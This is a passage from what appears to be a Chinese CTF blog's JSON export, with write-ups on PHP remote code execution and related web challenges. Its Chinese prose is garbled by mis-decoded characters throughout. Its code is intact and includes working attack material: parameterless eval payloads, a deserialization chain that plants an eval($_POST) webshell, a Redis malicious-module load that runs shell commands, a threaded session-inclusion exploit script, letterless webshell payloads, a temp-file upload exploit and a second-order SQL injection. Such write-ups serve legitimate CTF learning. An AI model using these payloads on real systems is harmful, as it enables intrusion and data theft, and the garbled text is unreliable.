æ­¤æˆ‘ä»¬è¿™æ ·æ„å»ºpayloadï¼š 1234eval($_GET(&#x27;a&#x27;));?a=eval(end(current(get_defined_vars())));&amp;b=phpinfo(); åˆ†æè¿™ä¸ªpayloadï¼Œé¦–å…ˆå°†äºŒç»´æ•°ç»„è½¬åŒ–ä¸ºä¸€ç»´æ•°ç»„ï¼Œç”±äºGETæ–¹å¼é»˜è®¤å°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå› æ­¤ç›´æ¥ç”¨current()å°±å¯ä»¥äº†ï¼ŒPOSTæ–¹å¼å°±ç”¨next()ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ¥ç€ç”±äºæˆ‘ä»¬å†æ¬¡å®šä¹‰äº†$bå¹¶è¿›è¡Œä¼ å‚ï¼Œå› æ­¤current(get_defined_vars())å¾—åˆ°çš„ç»“æœåº”è¯¥ä¸ºï¼š 1234array(2)&#123;[&quot;a&quot;]=&gt;string(39) &quot;eval(end(current(get_defined_vars())));&quot;[&quot;b&quot;]=&gt;string(10) &quot;phpinfo();&quot;&#125; è¿™æ—¶å€™æˆ‘ä»¬å–æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¾—åˆ°çš„å°±æ˜¯phpinfo();ï¼Œå› æ­¤å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„è¯­å¥äº†ã€‚ ä½†å¦‚æœç½‘ç«™çš„è¿‡æ»¤è¾ƒä¸ºä¸¥æ ¼æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½è¦ä½¿ç”¨$_FILESï¼Œè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ä¸Šä¼ æ–‡ä»¶æ¥è§£å†³é—®é¢˜äº†ï¼Œç¼–å†™expï¼š 12345678910111213import requestsfrom io import BytesIOpayload = &quot;system(&#x27;ls&#x27;);&quot;.encode(&#x27;hex&#x27;)files = &#123; payload: BytesIO(&#x27;mrl64&#x27;)&#125;r = requests.post(&#x27;http://xx.xx.xx.xx/index.php?a=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;, files=files, allow_redirects=False)print r.content//system(&#x27;ls&#x27;); æ–¹æ³•ä¸‰getallheaders()å¯ä»¥è·å–åœ¨apache2ç¯å¢ƒä¸‹çš„httpå¤´æ–‡ä»¶ï¼Œå¹¶ä¸”è¿”å›çš„ä¹ŸåŒæ ·æ˜¯æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´æ”¹å¤´æ–‡ä»¶çš„å†…å®¹ï¼Œæ¯”å¦‚åœ¨å¤´æ–‡ä»¶æœ€åæ·»åŠ ä¸€ä¸ªmrl64=phpinfo();ï¼Œè¿™æ ·getallheaders()è¿”å›çš„å¤´æ–‡ä»¶ä¸­çš„æœ€åä¸€ä¸ªå†…å®¹å°±æ˜¯[&quot;mrl64&quot;]=&gt;string(10) &quot;phpinfo();&quot;äº†ï¼Œåˆ©ç”¨end()å°†è¿™ä¸ªå†…å®¹è¯»å–å‡ºæ¥ï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œpayloadï¼š 12345eval($_GET(&#x27;a&#x27;));?a=eval(end(getallheaders()));mrl64: phpinfo(); æ–¹æ³•å››è¿™ä¸ªæ–¹æ³•çš„æ€è·¯è·³å‡ºäº†å¸¸è§„çš„rceï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯ç›´æ¥è¯»å–æ–‡ä»¶ï¼Œå’Œä»»æ„æ–‡ä»¶è¯»å–æ¯”è¾ƒç›¸è¿‘ã€‚ getcwd() - è·å–å½“å‰ç›®å½•ï¼Œè¿”å›å­—ç¬¦ä¸² scandir() - è¿›è¡Œå½“å‰ç›®å½•éå†ï¼Œè¿”å›æ•°ç»„ dirname() - è¿›è¡Œç›®å½•ä¸Šè·³ chdir() - æ›´æ”¹å½“å‰ç›®å½• readfile() - è¯»å–æ–‡ä»¶ æ¯”å¦‚æˆ‘ä»¬æƒ³è¦è¯»å–/var/www/flagï¼Œå°±å¯ä»¥è¿™æ ·æ„å»ºpayloadï¼š 1234eval($_GET(&#x27;a&#x27;));?a=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); è¯¦ç»†çš„æ— å‚æ•°rceï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼šPHP Parametric Function RCE æ€»ç»“ä»¥ä¸Šè¿™äº›æ–¹æ³•éƒ½æ˜¯ä»å„è·¯å¤§ç¥é‡Œæ€»ç»“å‡ºæ¥çš„ï¼Œå¯¹äºä¸€äº›ç»å…¸çš„rceé¢˜ç›®åº”è¯¥ä¼šæœ‰æ‰€å¸®åŠ©ï¼Œç›¸ä¿¡è¿˜æœ‰æ›´å¤šçš„æ–¹æ³•ç­‰å¾…æˆ‘ä»¬å»å‘ç°ã€å»æŒ–æ˜ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-webshell -web","slug":"webshell-web","permalink":"http://example.com/tags/webshell-web/"}]},{"title":"NSSCTFç»ƒä¹ 1","slug":"NSSCTFç»ƒä¹ 1","date":"2022-03-04T07:23:53.000Z","updated":"2022-03-04T11:20:52.047Z","comments":true,"path":"2022/03/04/NSSCTFç»ƒä¹ 1/","link":"","permalink":"http://example.com/2022/03/04/NSSCTF%E7%BB%83%E4%B9%A01/","excerpt":"å‰è¨€æ¢ä¸ªå¹³å°ç»§ç»­åˆ·ï¼Œç¢°åˆ°ä»€ä¹ˆåšä»€ä¹ˆï¼Œç„¶åè®°å½•ä¸€äº›æ¯”è¾ƒæœ‰æ„æ€æˆ–è€…è®¾è®¡çŸ¥è¯†ç›²åŒºçš„é¢˜ã€‚","text":"å‰è¨€æ¢ä¸ªå¹³å°ç»§ç»­åˆ·ï¼Œç¢°åˆ°ä»€ä¹ˆåšä»€ä¹ˆï¼Œç„¶åè®°å½•ä¸€äº›æ¯”è¾ƒæœ‰æ„æ€æˆ–è€…è®¾è®¡çŸ¥è¯†ç›²åŒºçš„é¢˜ã€‚ [å¤©ç¿¼æ¯ 2021]esay_evalå®¡è®¡æºç ï¼š 1234567891011121314151617181920212223242526272829303132&lt;?phpclass A&#123; public $code = &quot;&quot;; function __call($method,$args)&#123; eval($this-&gt;code); &#125; function __wakeup()&#123; $this-&gt;code = &quot;&quot;; &#125;&#125;class B&#123; function __destruct()&#123; echo $this-&gt;a-&gt;a(); &#125;&#125;if(isset($_REQUEST[&#x27;poc&#x27;]))&#123; preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret); if (isset($ret[1])) &#123; foreach ($ret[1] as $i) &#123; if(intval($i)!==1)&#123; exit(&quot;you want to bypass wakeup ? no !&quot;); &#125; &#125; unserialize($_REQUEST[&#x27;poc&#x27;]); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; å‘ç°popé“¾ï¼Œä¸è¿‡è¿™ä¸ªé“¾æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨Bç±»ä¸­çš„__destruct()ï¼ŒBä¸­å­˜åœ¨ä¸€ä¸ªaæ–¹æ³•ï¼Œå¦è¿™ä¸ªaæ–¹æ³•ä¸ºAç±»ï¼Œç„¶ååˆ©ç”¨é­”æœ¯æ–¹æ³•æ‰§è¡ŒechoæŒ‡ä»¤æ—¶ç”±äºAç±»ä¸­ä¸å­˜åœ¨aæ–¹æ³•ï¼Œå› æ­¤ä¼šè°ƒç”¨__callé­”æœ¯æ–¹æ³•æ‰§è¡Œevalï¼Œä½†æ˜¯è¦ç»•è¿‡__wakeupã€‚ é¦–å…ˆå†™expï¼š 123456789101112131415&lt;?phpclass A&#123; public $code = &quot;phpinfo();&quot;;&#125;class B&#123; public $a;&#125;$a = new B();$a -&gt; a = new A();echo serialize($a);?&gt; //O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; ç”±äºæºç ä¸­åˆ¤æ–­äº†ååºåˆ—åŒ–çš„å±æ€§ä¸ªæ•°å¿…é¡»ä¸º1ï¼Œè¿™é‡Œä¸èƒ½ç›´æ¥æ”¹æ•°å­—ç»•è¿‡ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š å¢åŠ çœŸå®å±æ€§ä¸ªæ•° 1O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:1;&quot;a&quot;;&#125; å¤§å°å†™ç»•è¿‡ï¼Œç”±äºç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤æ”¹å°å†™æ”¹å€¼å°±å¯ä»¥äº† 1O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; æŸ¥çœ‹phpinfoï¼Œå‘ç°å‘½ä»¤æ‰§è¡Œçš„æŒ‡ä»¤å‡ ä¹éƒ½è¢«ç¦æ­¢äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå†™å…¥shellï¼š 1O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:22:&quot;eval($_POST[&#x27;mrl64&#x27;]);&quot;;&#125;&#125; èšå‰‘è¿æ¥ï¼Œè¿™é‡Œå­¦åˆ°äº†è¦ä¸Šä¼ æ¶æ„soæ–‡ä»¶æ¥è¿æ¥redisï¼šæ¶æ„soæ–‡ä»¶ æ¥ç€ä½¿ç”¨èšå‰‘çš„redisæ’ä»¶è¿æ¥ï¼Œå¯†ç åœ¨htmlç›®å½•ä¸‹çš„config.php.swpæ–‡ä»¶ä¸­ï¼Œè¿æ¥åé€‰æ‹©db0æ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤ï¼š 123MODULE LOAD &quot;/var/www/html/exp.so&quot;system.exec &quot;ls /&quot;system.exec &quot;cat /f*&quot; å¾—åˆ°flagï¼Œè¿™é¢˜ç»¼åˆè¿˜æ˜¯æŒºéš¾çš„ã€‚ [ç¬¬äº”ç©ºé—´ 2021]EasyCleanupå®¡è®¡ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php if(!isset($_GET[&#x27;mode&#x27;]))&#123; highlight_file(__file__); &#125;else if($_GET[&#x27;mode&#x27;] == &quot;eval&quot;)&#123; $shell = isset($_GET[&#x27;shell&#x27;]) ? $_GET[&#x27;shell&#x27;] : &#x27;phpinfo();&#x27;; if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); eval($shell); &#125; if(isset($_GET[&#x27;file&#x27;]))&#123; if(strlen($_GET[&#x27;file&#x27;]) &gt; 15 | filter($_GET[&#x27;file&#x27;])) exit(&quot;hacker&quot;); include $_GET[&#x27;file&#x27;]; &#125; function filter($var)&#123; $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;]; foreach($banned as $ban)&#123; if(strstr($var, $ban)) return True; &#125; return False; &#125; function checkNums($var)&#123; $alphanum = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;; $cnt = 0; for($i = 0; $i &lt; strlen($alphanum); $i++)&#123; for($j = 0; $j &lt; strlen($var); $j++)&#123; if($var[$j] == $alphanum[$i])&#123; $cnt += 1; if($cnt &gt; 8) return True; &#125; &#125; &#125; return False; &#125; ?&gt; çœ‹ç€å¥½åƒå’Œrceå¾ˆåƒï¼Œä½†æ˜¯è¿™ä¸ªè¿‡æ»¤å‡ ä¹æŠŠrceçš„è·¯ç»™å µæ­»äº†ï¼Œæˆ‘ä»¬çœ‹çœ‹phpinfoï¼Œå‘ç°session.use_strict_mode=0ï¼Œä¸”session.upload_process.cleanupä¸ºoffï¼Œä¸éœ€è¦æ¡ä»¶ç«äº‰ã€‚æ²¡æœ‰session.save_pathï¼Œæ–‡ä»¶é»˜è®¤å‚¨å­˜åœ¨/tmp/sess_xxxxã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨sessionåŒ…å«æ¥è§£é¢˜ã€‚ è¡¨å•ï¼š 12345&lt;form action=&quot;http://1.14.71.254:28017/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;&lt;?php eval($_POST[&#x27;mrl64&#x27;]);?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè®°å¾—æ³¨æ„æ·»åŠ cookieï¼šCookie: PHPSESSID=233ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯ï¼š 1http://1.14.71.254:28017/?file=/tmp/sess_233 æˆ–è€…å¤§ä½¬ä»¬ç›´æ¥ç”¨è„šæœ¬è·‘ï¼š 123456789101112131415161718192021222324252627282930import ioimport requestsimport threadingfrom cffi.backend_ctypes import xrangesessid = &#x27;0&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post( &#x27;http://1.14.71.254:28017/&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(f&quot;http://1.14.71.254:28017/?mode=foo&amp;file=/tmp/sess_&#123;sessid&#125;&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;) if &#x27;tgao.txt&#x27; in resp.text: print(resp.text) event.clear() else: print(&quot;[+++++++++++++]retry&quot;) #print(resp.text)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() [é¹¤åŸæ¯ 2021]EasyPå®¡è®¡æºç ï¼š 123456789101112131415161718192021222324252627 &lt;?phpinclude &#x27;utils.php&#x27;;if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125;&#125;if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;hacker :)&quot;);&#125;if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; exit(&quot;hacker :)&quot;);&#125;if (isset($_GET[&#x27;show_source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;else&#123; show_source(__FILE__);&#125;?&gt; æˆ‘ä»¬è¦åšçš„æ˜¯ä¸Šä¼ ä¸€ä¸ªguesså˜é‡å’Œsecretçš„å€¼ç›¸åŒï¼Œè¿™æƒ³æƒ³éƒ½ä¸å¯èƒ½ï¼Œå› æ­¤è¿™ä¸ªåœ°æ–¹å®Œå…¨æ²¡ç”¨ã€‚æˆ‘ä»¬æ¥çœ‹ä¸‹é¢ä¸€ä¸²ä¸œè¥¿ï¼š 123$_SERVER[&#x27;PHP_SELF&#x27;]ï¼šè·å–å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å$_SERVER[&#x27;REQUEST_URI&#x27;]ï¼šå–å¾—å½“å‰URLçš„è·¯å¾„åœ°å€basename()ï¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ† é¦–å…ˆurlè¿‡æ»¤äº†show_sourceï¼Œç›´æ¥urlç¼–ç ç»•è¿‡å°±å¯ä»¥äº†ã€‚è€Œå…³é”®éƒ¨åˆ†åœ¨highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));è¿™ä¸²ä¸Šã€‚æˆ‘ä»¬æ„å»ºpayloadå¹¶å¼€å§‹åˆ†æï¼š 1http://1.14.71.254:28032/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65 é¦–å…ˆè·å–$_SERVER[&#39;PHP_SELF&#39;]ï¼Œè¿™ä¸ªå‡½æ•°æ‰€è·å–åˆ°çš„å†…å®¹ä¸º/index.php/utils.php/%ffï¼Œæ¥ç€basename()ä¼šè·å–è·¯å¾„å°¾çš„æ–‡ä»¶åï¼Œå³/utils.php/%ffã€‚ ç”±äºæ–‡ä»¶å°¾çš„ä¸å¯æ‰“å°å­—ç¬¦ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…éƒ¨åˆ†ï¼Œè€Œbasename()åœ¨è·å–åç§°æ—¶ä¼šè‡ªåŠ¨ä¸¢å¼ƒä¸å¯æ‰“å°å­—ç¬¦ï¼Œå› æ­¤æˆåŠŸè¯»å–åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œæ‹¿åˆ°flagã€‚ hardrceå®¡è®¡æºç ï¼š 123456789101112131415161718192021222324&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123; $wllm = $_GET[&#x27;wllm&#x27;]; $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123; die(&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;); &#125;&#125;if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))&#123; die(&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;);&#125;echo &quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;;eval($wllm);&#125;else&#123; echo &quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;;&#125; å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªrceï¼Œä½†æ˜¯è¿‡æ»¤äº†å­—æ¯çš„ç›¸å½“ä¸€éƒ¨åˆ†ç¬¦å·ï¼Œè¿™é‡Œå°±æ˜¯ç‰¹æ®Šçš„æ— å­—ç¬¦webshelläº†ï¼Œç ”ç©¶è¿™ä¸ªçš„æ—¶å€™å‘ç°è¿™ä¸€å—è¿˜æŒºæœ‰æ„æ€çš„ï¼ŒæŒ–ä¸ªå‘ä¹‹åå†™ç¯‡åšå®¢ã€‚ è¿”å›æ¥é¢˜ç›®ï¼Œè¿™é‡Œå‘ç°æŒ‰ä½å–åæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå› æ­¤ç›´æ¥å‚è€ƒpç‰›çš„æ–‡ç« ï¼šæ— æ•°å­—å­—æ¯webshellä¹‹æé«˜ç¯‡ ç®€å•çš„ç”Ÿæˆpayloadè„šæœ¬ï¼š 12345def get(shell): hexbit = &#x27;&#x27;.join(map(lambda x:hex(~(-(256-ord(x)))),shell)) print hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)get(&#x27;phpinfo&#x27;) æ„é€ payloadï¼š 12345?wllm=(~%8c%86%8c%8b%9a%92)(~%93%8c%df%d0);//system(&#x27;ls \\&#x27;)?wllm=(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%d0%99%93%93%93%93%93%9e%9e%9e%9e%9e%9e%98%98%98%98%98%98%98);//system(&#x27;cat /flllllaaaaaaggggggg&#x27;)","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"}]},{"title":"buuç»ƒä¹ 4","slug":"buuç»ƒä¹ 4","date":"2022-03-03T07:35:36.000Z","updated":"2022-03-03T11:22:56.674Z","comments":true,"path":"2022/03/03/buuç»ƒä¹ 4/","link":"","permalink":"http://example.com/2022/03/03/buu%E7%BB%83%E4%B9%A04/","excerpt":"å‰è¨€ ç­‰æ‰“è™ç¬¦äº†ï¼Œè™½ç„¶åº”è¯¥åªèƒ½æ˜¯å»çœ‹çœ‹é¢˜ï¼Œä½†ç°åœ¨è¯¥ç»ƒçš„é¢˜è¿˜å¾—ç»ƒã€‚","text":"å‰è¨€ ç­‰æ‰“è™ç¬¦äº†ï¼Œè™½ç„¶åº”è¯¥åªèƒ½æ˜¯å»çœ‹çœ‹é¢˜ï¼Œä½†ç°åœ¨è¯¥ç»ƒçš„é¢˜è¿˜å¾—ç»ƒã€‚ [NPUCTF2020]ezincludeè¿›å…¥ç½‘é¡µæŸ¥çœ‹ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªè´¦å·å¯†ç é”™è¯¯çš„æç¤ºï¼Œå®¡æŸ¥å…ƒç´ å‘ç°hintï¼š 1md5($secret.$name)===$pass å› æ­¤æˆ‘ä»¬è¦æ‰¾åˆ°$passçš„å€¼ï¼Œå‘ç°cookieä¸­å­˜åœ¨hashå€¼ï¼Œå°†è¿™ä¸ªå€¼èµ‹å€¼ç»™$passä¼ å‚ï¼Œé¡µé¢è·³è½¬åˆ°404.htmlï¼Œæ‰¾äº†ä¸‹ä¹Ÿæ²¡å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå°è¯•æŠ“åŒ…ï¼Œå‘ç°window.location.href=&quot;flflflflag.php&quot;;ï¼Œå› æ­¤æŠ“åŒ…è®¿é—®flflflflag.phpã€‚ å‘ç°æ–‡ä»¶åŒ…å«ï¼š 1include($_GET[&quot;file&quot;]) å°è¯•è¯»å–æºç ï¼š 1?file=php://filter/read=convert.base64-encode/resource=flflflflag.php flflflflag.phpï¼š 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt;&lt;/body&gt;&lt;/html&gt; è¿™é‡Œè¦å†™å…¥webshellï¼Œä½†æ˜¯èƒ½å†™å…¥çš„ä¼ªåè®®éƒ½è¢«æ­£åˆ™åŒ¹é…äº†ï¼Œå› æ­¤è¿™é‡Œä¸èƒ½ç”¨ä¼ªåè®®å†™ç ã€‚é¦–å…ˆæ‰«æç›®å½•å‘ç°å­˜åœ¨dir.phpï¼Œè¿™ä¸ªåˆ—å‡ºäº†/tmpçš„ç›®å½•ã€‚æ‰¾äº†äº›èµ„æ–™å‘ç°è¿™é‡Œè¦åˆ©ç”¨åˆ°php7 segment faultç‰¹æ€§ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ã€‚å…·ä½“åŸç†å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šPHPä¸´æ—¶æ–‡ä»¶æœºåˆ¶ä¸åˆ©ç”¨çš„æ€è€ƒ å› æ­¤æˆ‘ä»¬ç¼–å†™exp: 12345678910import requestsfrom io import BytesIOurl=&quot;http://c45cf755-5dfc-4ae1-a036-eebe8522322a.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php phpinfo();?&gt;&quot;files=&#123; &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text) å†æ¬¡æŸ¥çœ‹dir.phpï¼š 12345678array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;phpUkHKUU&quot;&#125; ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥è®¿é—®ï¼Œflagå°±åœ¨phpinfoé¡µé¢ä¸­ã€‚ [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunkè¿›å…¥ç½‘é¡µåå®¡æŸ¥å…ƒç´ ï¼Œå‘ç°hintï¼š?file=ï¼Œæ€€ç–‘å¯èƒ½æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå› æ­¤å°è¯•ä¼ªåè®®è¯»å–æºç ï¼ŒæŠŠæ‰€æœ‰ç½‘é¡µçš„æºç éƒ½è¯»ä¸‹æ¥ã€‚è¯»å–å®Œåå‘ç°å¯¹sqlæ³¨å…¥çš„é™åˆ¶éå¸¸ä¸¥æ ¼ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªåœ°æ–¹æœ‰ä¾‹å¤–ï¼Œæˆ‘ä»¬æŸ¥çœ‹change.phpï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;; &#125; else &#123; $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;; &#125;&#125;else &#123; $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;&#125;?&gt; æˆ‘ä»¬å‘ç°åœ¨å¯¹addressè¿›è¡Œè¿‡æ»¤æ—¶ï¼Œåªæ˜¯ç”¨äº†addslashes()æ¥è¿›è¡Œè½¬ä¹‰ï¼Œè¿™å¯¼è‡´äº†å•å¼•å·çš„å¤±æ•ˆã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨äºŒæ¬¡æ³¨å…¥çš„æ–¹å¼ç»•è¿‡ï¼Œæ³¨æ„åˆ°change.phpä¸­çš„sqlè¯­å¥ï¼š 1$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; è¿™é‡Œå¯¹åœ°å€è¿›è¡Œäº†ä¿å­˜ï¼Œè€Œå½“æˆ‘ä»¬å†æ¬¡ä¿®æ”¹åœ°å€çš„æ—¶å€™ï¼Œå®ƒä¼šå°†æˆ‘ä»¬çš„æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œæ³¨å…¥ã€‚ å› æ­¤ç¬¬ä¸€æ¬¡å…ˆéšä¾¿è¾“å…¥ï¼Œç¬¬äºŒæ¬¡æˆ‘ä»¬ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œç”±äºè¾“å‡ºé•¿åº¦æœ‰é™ï¼Œå› 